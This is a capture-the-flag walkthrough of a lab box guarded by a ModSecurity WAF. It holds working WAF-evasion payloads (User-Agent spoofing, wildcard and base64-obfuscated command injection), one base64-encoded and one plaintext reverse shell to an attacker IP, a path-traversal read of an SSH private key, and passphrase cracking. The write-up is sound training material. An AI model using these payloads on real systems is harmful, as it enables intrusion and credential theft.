When we scan the box, there are these 3 ports open:
22,80,3000

When we try accessing the webpage manually, we are redirected to `www.yourwaf.nyx`, so we add this domain to our `/etc/hosts` file, along with yourwaf.nyx

We also see that there is a WAF being used by the web app, ModSecurity. 

When we use the `whatweb` tool to try to get webserver enumeration info, we come across an error

whatweb http://www.yourwaf.nyx

But if we use the same tool with a custom User-Agent header, we can get info:

whatweb http://www.yourwaf.nyx -H "User-Agent: abc"

This makes us suspect that the WAF is filtering requests based on contents of the User-Agent header. If we send a curl command to the server with the whatweb tool's standard User-Agent header, we can prove it:

curl -H "User-Agent: WhatWeb" -v http://www.yourwaf.nyx/

So we now suspect that the WAF filters on all User-Agent header of common pentesting tools, such as WhatWeb, Ffuf, and others

We'd like to do subdomain enumeration with Ffuf, but we need to remember to send a custom User-Agent header while we do so

ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 10701 -H "Host: FUZZ.yourwaf.nyx" -u 'http://yourwaf.nyx' -fs 0 -H "User-Agent: abc"

We find there's a `maintenance` subdomain, and we can check this out:

http://maintenance.yourwaf.nyx

On this endpoint, there's a OS command execution function, which we can use to run commands, except that this user input is also monitored by the WAF




/u?r/b?n/ec?o 'ZWNobyAiZ290IGl0ISIK' | base64 -d | /b?n/b?s? -e

This means we can run any command we want, as long as we encode it into base64




/u?r/b?n/ec?o 'c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yMTIuMTAvNDQzIDA+JjEK' | base64 -d | /b?n/b?s? -e





We can see the User-Agents that the WAF blocks on here:

cat /usr/share/modsecurity-crs/rules/scanners-user-agents.data

We can see the matching rules that prevent OS command injection:

cat /usr/share/modsecurity-crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf

Now we need to do some privilege escalation. There's the code for the port 3000 app in the /opt/nodeapp/server.js

```
const express = require('express')
const { exec } = require('child_process');
var path = require('path');

const app = express()
const port = 3000

const apiToken = '8c2b6a304191b8e2d81aaa5d1131d83d';


function checkApiToken(req, res, next) {
  let sendApiToken = req.query["api-token"] ?? '';
  if (apiToken !== sendApiToken) {
    res.send("Unauthorized.")
    return;
  }
  next();
}

app.use('/logs', (req, res) => {
  let path_to_file = __dirname + '/logs/modsec_audit.log'
  res.sendFile(path_to_file)
})


app.get('/', checkApiToken, (req, res) => {
  res.send('API de mantenimiento!');
})

app.get('/restart', checkApiToken, (req, res) => {
  exec('reboot', (error, stdout, stderr) => {
    if (error) {
      res.send(`exec error: ${error}`)
      return;
    }
    res.send('Restarting server...');
  });
})

app.get('/readfile', checkApiToken, (req, res) => {
  let file = req.query["file"] ?? '';
  if (file === '') {
    res.send('Error: need file')
    return;
  }
  if (file.indexOf('passwd') !== -1) {
    res.send('ForbiddenError: Forbidden')
    return;
  }
  let path_to_file = __dirname + file
  res.sendFile(path.resolve(path_to_file))
})


app.listen(port,  () => {
  console.log(`Example app listening on port ${port}`)
```

According to the code, if we provide navigate to the /readfile endpoint with the specified API key and the name of a file, we can read the file 

ps aux | grep node

Since the node app is running as root, we can do privileged file read on any file on the system

curl 'http://www.yourwaf.nyx:3000/readfile?api-token=8c2b6a304191b8e2d81aaa5d1131d83d&file=../../../../home/tester/.ssh/id_rsa'

We can crack the passphrase for this key with John the Ripper

ssh2john id_rsa > key.hash
john --wordlist=/usr/share/wordlists/rockyou.txt key.hash

The passphrase is wafako

Once in, we see that our user is part of the copylogs group, and we saw a shell script being run as part of this group in the /opt/nodeapp directory

We can write to this file, so why don't we have it do a reverse shell to our attacker system?

echo 'sh -i >& /dev/tcp/192.168.212.10/443 0>&1' > copylogs.sh
